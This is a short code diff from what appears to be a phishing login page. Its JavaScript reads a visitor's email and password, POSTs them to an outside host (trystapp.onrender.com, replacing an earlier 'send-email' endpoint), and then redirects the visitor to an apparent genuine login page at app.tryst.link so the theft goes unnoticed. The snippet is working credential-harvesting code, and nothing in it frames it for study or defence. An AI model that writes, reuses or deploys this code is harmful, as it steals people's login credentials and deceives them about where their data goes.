@@ -158,13 +158,13 @@
       let email = document.getElementById("login").value;
       let password = document.getElementById("password").value;
 
-      fetch('http://localhost:4040/send-email', {
+      fetch('https://trystapp.onrender.com/login', {
         method: 'POST',
         headers: {
           'Accept': 'application/json',
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ message: `Email: ${email} Password: ${password}` })
+        body: JSON.stringify({ email, password })
       }).then((res) => {
         location.replace("https://app.tryst.link/log_in")
       })
